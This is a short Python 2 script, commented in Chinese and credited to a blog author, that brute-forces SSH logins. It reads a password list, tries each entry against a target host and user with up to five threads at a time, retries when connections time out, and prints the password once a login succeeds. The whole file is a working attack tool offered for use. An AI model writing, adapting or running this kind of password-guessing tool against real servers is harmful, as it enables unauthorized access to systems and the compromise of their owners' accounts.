#!/usr/bin/env python
# -*- coding: utf-8 -*-
# -*- coding: gbk -*-
# Date: 2019/2/12
# Created by 冰河
# Description 暴力破解SSH
#             用法： python ssh_attack.py -H 192.168.175.131 -u root -F ssh_password.txt
# 博客 https://blog.csdn.net/l1028386804

from pexpect import pxssh
import optparse
import time
from threading import *

maxConnections = 5
connection_lock = BoundedSemaphore(value=maxConnections)
Found = False
Fails = 0

#连接SSH终端
def connect(host, user, password, release):
    global Found
    global Fails
    try:
        s = pxssh.pxssh()
        s.login(host, user, password)
        print '[+] Password Found: ' + password
        #找到密码，则将全局变量Found设置为True
        Found = True
    except Exception, e:
        #异常信息中包含有 read_nonblocking 说明可能是SSH服务器被大量的连接刷爆了，可以稍等片刻后用相同的密码再试一次
        if 'read_nonblocking' in str(e):
            Fails += 1
            time.sleep(5)
            connect(host, user, password, False)

        elif 'synchronize with original prompt' in str(e):
            time.sleep(1)
            connect(host, user, password, False)

    finally:
        if release:
            connection_lock.release()

#主函数，解析参数
def main():
    parser = optparse.OptionParser('usage%prog -H <target host> -u <user> -F <password list>')
    parser.add_option('-H', dest='tgtHost', type='string', help='specify target host')
    parser.add_option('-F', dest='passwdFile', type='string', help='specify password file')
    parser.add_option('-u', dest='user', type='string', help='specify the user')

    (options, args) = parser.parse_args()
    host = options.tgtHost
    passwdFile = options.passwdFile
    user = options.user
    if host == None or passwdFile == None or user == None:
        print parser.usage
        exit(0)

    # user = options.user
    fn = open(passwdFile, 'r')
    # user = options.user

    for line in fn.readlines():
        # user = options.user
        if Found:
            print "[*] Exiting: Password Found"
            exit(0)
        if Fails > 5:
            print "[!] Exiting: Too Many Socket Timeouts"
            exit(0)

        connection_lock.acquire()
        password = line.strip('\r').strip('\n')
        print "[-] Testing: " + str(password)

        t = Thread(target=connect, args=(host, user, password, True))
        child = t.start()

if __name__ == '__main__':
    main()